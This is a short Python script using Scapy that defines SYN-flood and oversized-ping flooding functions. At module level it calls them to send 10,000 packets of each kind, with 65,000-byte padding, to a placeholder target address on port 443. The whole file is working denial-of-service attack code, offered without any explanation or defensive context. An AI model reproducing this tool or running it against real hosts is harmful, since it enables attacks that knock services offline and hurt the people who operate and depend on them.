from scapy.layers.inet import IP, ICMP, TCP
from scapy.sendrecv import send
from scapy.volatile import RandShort
from scapy.packet import Raw



def syn_attack(ip_address: str, port: int, packets: int = 4, packet_size: int = 65000):
    ip = IP(dst=ip_address)
    tcp = TCP(sport=RandShort(), dport=port, flags="S")
    raw_data = Raw(b"X" * packet_size)
    p = ip / tcp / raw_data
    send(p, count=packets, verbose=0)
    print('syn_attack(): Sent ' + str(packets) + ' packets of ' + str(packet_size) + ' size to ' + ip_address + ' on port ' + str(port))


def ping_attack(ip_address: str, packets: int = 4, packet_size: int = 65000):
    ip = IP(dst=ip_address)
    icmp = ICMP()
    raw_data = Raw(b"X" * packet_size)
    p = ip / icmp / raw_data
    send(p, count=packets, verbose=0)
    print('ping_attack(): Sent ' + str(packets) + ' pings of ' + str(packet_size) + ' size to ' + ip_address)


ip_address = "X.X.X.X"
port_number = 443
syn_attack(ip_address, port_number, packets=10000)
ping_attack(ip_address, packets=10000)